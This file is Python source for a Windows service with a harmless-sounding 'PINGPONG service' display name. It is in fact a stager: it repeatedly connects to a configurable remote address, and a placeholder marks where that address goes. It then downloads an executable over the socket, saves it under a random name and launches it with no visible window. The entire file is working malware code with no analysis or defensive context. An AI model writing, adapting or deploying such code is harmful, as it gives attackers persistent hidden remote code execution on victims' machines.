# -*- coding:utf-8 -*-
# @FileName  :pingpong_service.py
# @Time      :2023/01/12 16:37:44
# @Author    :D0WE1L1N
import win32serviceutil 
import win32service 
import win32event 
import socket
from time import sleep
import win32timezone
from os import remove
from sys import argv
import servicemanager
from os.path import isfile
from sys import exit
from win32process import CreateProcess, CREATE_NO_WINDOW, STARTUPINFO
from random import randint


class PythonService(win32serviceutil.ServiceFramework): 
    _svc_name_ = "Piposvc"
    _svc_display_name_ = "PINGPONG service"
    _svc_description_ = "PINGPONG service of your host"
    def generate_random_str(self, randomlength=16):
        random_str =''
        base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        length =len(base_str) -1
        for i in range(randomlength):
            random_str +=base_str[randint(0, length)]
        return random_str
    
    def collect_payload(self, s):
        len_data = s.recv(1024).decode('utf8')
        s.send(bytes("OK", "UTF8"))
        upload_data = s.recv(int(len_data))
        if isfile(f'{self._id}.exe'):
            remove(f'{self._id}.exe')
        f = open(f"{self._id}.exe", "wb+")
        f.write(upload_data)
        f.close()
        s.close()
        CreateProcess(f"{self._id}.exe", '', None, None, 0, CREATE_NO_WINDOW, None, None, STARTUPINFO())
        exit(0)
    def main(self):
        ip, port = self.ip, self.port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            ret_code = win32event.WaitForSingleObject(self.hWaitStop, self.time_out)
            if ret_code == win32event.WAIT_OBJECT_0:
                break
            try:
                res = s.connect((ip, port))
                if res:
                    break
            except:
                pass
            sleep(5)
        s.recv(1024)
        s.send(bytes(str(len(self._id)), 'utf8'))
        s.recv(1024)
        s.send(bytes(self._id, 'utf8'))
        is_make = s.recv(1024)
        if is_make == b'OK':
            self.collect_payload(s)
        elif is_make == b'wait':
            s.recv(1024)
            self.collect_payload(s)
        else:
            exit(0)

    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        self.main()
            
    def SvcStop(self): 
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)  
        win32event.SetEvent(self.hWaitStop) 
    def __init__(self, args): 
        self._id = self.generate_random_str()
        self.time_out = 5 * 1000
        win32serviceutil.ServiceFramework.__init__(self, args) 
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.ip, self.port = '127.0.0.1', 624

#WRITE_IN_LINE_FOR_IP_AND_PORT

if __name__=='__main__': 
    if len(argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(PythonService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(PythonService)  